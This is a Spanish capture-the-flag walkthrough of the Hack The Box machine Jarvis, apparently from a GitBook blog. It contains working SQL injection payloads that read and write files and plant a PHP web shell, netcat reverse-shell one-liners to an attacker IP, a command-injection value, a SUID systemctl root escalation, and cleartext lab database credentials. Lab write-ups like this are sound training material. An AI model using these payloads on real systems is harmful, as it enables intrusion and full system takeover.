# Jarvis

![](../../../../~gitbook/image.md)Publicado: 21 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
### 📝 Descripción
Jarvis es una máquina Linux de dificultad media en Hack The Box. El objetivo principal es explotar una vulnerabilidad de inyección SQL en una aplicación web de un hotel para conseguir acceso inicial como usuario www-data. Posteriormente, se requiere escalar privilegios a través de un script Python vulnerable para alcanzar el usuario pepper, y finalmente abusar de un binario SUID (systemctl) para obtener acceso como root.La máquina destaca por la implementación de un sitio web de gestión hotelera con una vulnerabilidad clásica de SQLi, un ejemplo interesante de escalada horizontal a través de un script con filtros imperfectos, y una escalada vertical mediante el abuso de binarios con permisos especiales.Puntos clave:- Explotación de SQLi para lectura/escritura de archivos
- Pivotaje entre usuarios aprovechando configuraciones incorrectas de sudo
- Abuso de binarios SUID para alcanzar privilegios de root

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
![](../../../../~gitbook/image.md)⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 64999 HTTP
http://supersecurehotel.htb:64999/![](../../../../~gitbook/image.md)Aparte de este banner, no hay nada interesante.
#### 80 HTTP
http://supersecurehotel.htb![](../../../../~gitbook/image.md)
#### Fuzzing de directorios
Feroxbuster![](../../../../~gitbook/image.md)Dirsearch![](../../../../~gitbook/image.md)Gobuster![](../../../../~gitbook/image.md)Me gusta probar siempre varias herramientas para luego poner en conjunción los resultados. Aquí parece que hay un recurso importante a analizar y es /phpmyadminhttp://supersecurehotel.htb/phpmyadmin/![](../../../../~gitbook/image.md)Probamos las credenciales por defecto root:admin sin éxito.Enumeramos la versión gracias al fichero READMEhttp://supersecurehotel.htb/phpmyadmin/README![](../../../../~gitbook/image.md)También enumeramos un fichero de changelog en el que se indican los cambios que han sido aplicados en cada versión, siendo la 4.8.0 la última:http://supersecurehotel.htb/phpmyadmin/ChangeLog![](../../../../~gitbook/image.md)Verificamos que la versión 4.8.0 de phpmyadmin podría ser vulnerable a Cross site request forgery:https://www.exploit-db.com/exploits/44496![](../../../../~gitbook/image.md)Aunque pronto verificamos que no nos sirve.
### 💻 Explotación (SQLi)
Seguimos enumerando el sitio web, no tiene mucho donde rascar excepto en la sección de reserva de habitaciones:Verificamos si el parámetro GET `cod` podría ser vulnerable a SQLi
http://supersecurehotel.htb/room.php?cod=2![](../../../../~gitbook/image.md)Introducimos simplemente una comilla en la petición y vemos que la respuesta se ve afectada:http://supersecurehotel.htb/room.php?cod=1'![](../../../../~gitbook/image.md)
Realizamos esta petición cod=1+and+1=1 y observamos que se recupera la información de la habitación, lo cual nos indica que el parámetro es vulnerable a inyección SQL.El siguiente paso será determinar el número de columnas de la consulta, asíque vamos probando:cod=1+union+select+1cod=1+union+select+1,2cod=1+union+select+1,2,3cod=1+union+select+1,2,3,4cod=1+union+select+1,2,3,4,5cod=1+union+select+1,2,3,4,5,6cod=1+union+select+1,2,3,4,5,6,7![](../../../../~gitbook/image.md)cod=1+union+select+1,2,3,4,5,6,7,8Determinamos que hay 7 columnas porque cuando introducimos 8 ya no recibimos la respuesta correcta.Ahora realizamos la inyección para determinar el usuario:![](../../../../~gitbook/image.md)Ahora realizamos la inyección para determinar el nombre de la base de datos:![](../../../../~gitbook/image.md)Verificamos si podemos leer archivos a través de esta vulnerabilidad:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Jarvis/Pasted image 20250521111537.png]]![](../../../../~gitbook/image.md)Verificamos si podemos subir archivos al sistemaAhora abrimos la dirección:http://supersecurehotel.htb/test.txtY verificamos que se ha subido correctamente:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Jarvis/Pasted image 20250521112126.png]]![](../../../../~gitbook/image.md)
#### Foothold
Con esta información, ahora podemos intentar subir una php shell mediante nuestra inyección sql:![](../../../../~gitbook/image.md)Verificamos la php shell que hemos subido:http://supersecurehotel.htb/shell.php?cmd=id![](../../../../~gitbook/image.md)Ahora podríamos conectarnos a nuestro host usando el siguiente payloadPero antes debemos codificarlo a URL:https://www.urlencoder.org/es/http://supersecurehotel.htb/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.8%201234%20%3E%2Ftmp%2FfGanamos acceso al host como usuario www-data:
#### Mejoramos la shell
Intentamos obtener la primera flag pero no tenemos permisos:
#### Escalando a usuario pepper
Verificamos si hay algún usuario que pueda ejecutar algún binario o script como sudo:Intentamos ejecutar este script en python como usuario pepper y vemos las opciones:![](../../../../~gitbook/image.md)Analizando el código del script vemos que una de las opciones puede ser interesante, ya que se está usando al opción -pf para realizar un ping y estoy hace una llamada a os.system, por lo que si pasamos como comando /bin/bash podremos obtener una shell como pepper:![](../../../../~gitbook/image.md)Probamos el comando ping:![](../../../../~gitbook/image.md)Como vemos que hay algunos caracteres que se están filtrando, vamos a crear un archivo con una reverse shell usando netcat -e para habilitar el reconocimiento de secuencias de escape, como , , etcLanzamos ahora el comando y cuando nos pida la IP introducimos de la siguiente forma la ruta a nuestra reverse shell:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Jarvis/Pasted image 20250521120419.png]]![](../../../../~gitbook/image.md)Recibimos la reverse shell como usuario pepper y obtenemos la primera flag:![](../../../../~gitbook/image.md)
#### 👑 Escalada de privilegios
Verificamos servicios en ejecución, vemos que hay una base de datos mysql aunque esto ya lo sabíamos por nuestra enumeración mediante la inyección sql:![](../../../../~gitbook/image.md)Encontramos un fichero de conexión a la base de datos con las credenciales en texto claro.
Tiene bastante buena pinta porque ya habíamos onbtenido el usuario DbAdmin y la base de datos hotel durante la inyección SQL:![](../../../../~gitbook/image.md)Nos conectamos a la base de datos:No encontramos nada que nos permita escalar privilegios.Verificamos archivos con SUID:El de systemctl puede ser interesante![](../../../../~gitbook/image.md)Encontramos información en gtfobins sobre como podemos abusar de este binario para escalar privilegios:https://gtfobins.github.io/gtfobins/systemctl/#suidNos movemos al directorio /home/pepper y ejecutamos lo siguiente:Creamos el enlace al servicio vulnerable:Esto creará un servicio que cuando lo invoquemos ejecutará un script que creamos en el directorio /home/pepper que será una reverse shell a nuestro host de ataque:El contenido de shell.sh será el siguiente:Iniciamos un listener en nuestro host de ataque:Lanzamos el servicioObtenemos acceso remoto al host como root y obtenemos la flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación (SQLi)](#explotacion-sqli)

```
❯  ping -c2 10.10.10.143
PING 10.10.10.143 (10.10.10.143) 56(84) bytes of data.
64 bytes from 10.10.10.143: icmp_seq=1 ttl=63 time=51.5 ms
64 bytes from 10.10.10.143: icmp_seq=2 ttl=63 time=46.0 ms

--- 10.10.10.143 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 45.958/48.735/51.512/2.777 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.143 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80,64999
```

```
nmap -sC -sV -p$ports 10.10.10.143 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 09:05 CEST
Nmap scan report for 10.10.10.143
Host is up (0.047s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.10.143 supersecurehotel.htb" | sudo tee -a /etc/hosts
```

```
feroxbuster -u http://supersecurehotel.htb -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 404 -x php,xml
```

```
dirsearch -u http://10.10.10.143
```

```
gobuster dir -u http://supersecurehotel.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt  -b 403,404,502 -x .php, .txt, .xml -r
```

```
cod=-2+union+select+1,user(),3,4,5,6,7+--+-
```

```
cod=-2+union+select+1,datbase(),3,4,5,6,7+--+-
```

```
cod=-2+union+select+1,load_file("/etc/passwd"),3,4,5,6,7+--+-
```

```
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
```

```
cod=-2+union+select+1,"pentesting",3,4,5,6,7+into+outfile+"/var/www/html/test.txt"+--+-
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
```

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.8%201234%20%3E%2Ftmp%2Ff
```

```
nc -nlvp 1234
```

```
script /dev/null -c bash

CTRL + Z

stty raw -echo; fg
reset xterm

export TERM=xterm
```

```
www-data@jarvis:/home/pepper$ ls
Web  user.txt
www-data@jarvis:/home/pepper$ cat user.txt
cat: user.txt: Permission denied
```

```
www-data@jarvis:/home/pepper$ sudo -l
Matching Defaults entries for www-data on jarvis:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/home/pepper$
```

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -h
```

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

```
echo -e '#!/bin/bash\nnc -e /bin/bash 10.10.14.8 4444' > /tmp/revshell.sh
```

```
nc -nlvp 4444
```

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

```
$(/tmp/revshell.sh)
```

```
ss -tulnp
```

```
mysql -u DBadmin -h localhost -pimissyou
show databases;
use mysql;
show tables;

```

```
pepper@jarvis:/var/www/html/phpmyadmin$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

```
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "/home/pepper/shell.sh"
[Install]
WantedBy=multi-user.target' > vulnerable.service
```

```
pepper@jarvis:~$ systemctl link /home/pepper/vulnerable.service
Created symlink /etc/systemd/system/vulnerable.service -> /home/pepper/vulnerable.service.
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 5555 >/tmp/f
```

```
nc -nlvp 5555
```

```
systemctl start vulnerable
```
